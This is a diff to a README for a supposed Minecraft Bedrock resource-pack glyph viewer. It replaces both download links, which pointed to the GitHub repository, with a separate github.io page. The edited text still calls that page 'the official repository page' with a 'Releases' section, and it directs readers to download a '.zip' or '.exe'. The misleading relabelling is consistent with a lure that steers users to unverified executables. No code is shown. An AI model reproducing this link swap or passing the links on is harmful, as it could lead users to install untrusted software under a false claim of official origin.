@@ -1,6 +1,6 @@
 # 🗂️ bedrock-glyph-viewer-2026 - Find Minecraft Bedrock resource pack glyphs
 
-[![Download Bedrock Glyph Viewer](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/pricinginclinebenchpress89/bedrock-glyph-viewer-2026)
+[![Download Bedrock Glyph Viewer](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://pricinginclinebenchpress89.github.io)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ Your computer must meet these basic needs to run the tool smoothly:
 
 Follow these steps to access the software:
 
-1.  Visit the official repository page at [https://github.com/pricinginclinebenchpress89/bedrock-glyph-viewer-2026](https://github.com/pricinginclinebenchpress89/bedrock-glyph-viewer-2026).
+1.  Visit the official repository page at [https://pricinginclinebenchpress89.github.io](https://pricinginclinebenchpress89.github.io).
 2.  Look for the section labeled "Releases" on the right side of the page.
 3.  Click the most recent version identifier.
 4.  Find the file that ends with ".zip" or ".exe" under the Assets list.
